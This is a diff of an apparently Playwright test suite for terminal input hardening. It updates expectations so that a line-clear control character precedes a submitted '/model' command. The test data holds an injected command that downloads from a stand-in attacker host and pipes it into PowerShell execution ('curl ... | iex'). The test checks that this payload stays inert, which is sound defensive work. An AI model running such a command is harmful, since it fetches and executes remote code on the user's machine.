@@ -307,10 +307,11 @@ test.describe("Terminal input hardening", () => {
       });
     });
 
-    expect(frames).toHaveLength(1);
+    expect(frames).toHaveLength(2);
+    expect(frames[0].data).toBe("\x15");
     // Exactly one submit, at the very end, with the payload inert inside the argument.
-    expect(frames[0].data).toBe("/model gpt-test curl http://evil.example/x | iex\r");
-    expect(frames[0].data.match(/\r/g)).toHaveLength(1);
+    expect(frames[1].data).toBe("/model gpt-test curl http://evil.example/x | iex\r");
+    expect(frames[1].data.match(/\r/g)).toHaveLength(1);
   });
 
   test("stops a stored snippet from chaining a second command", async ({ page }) => {
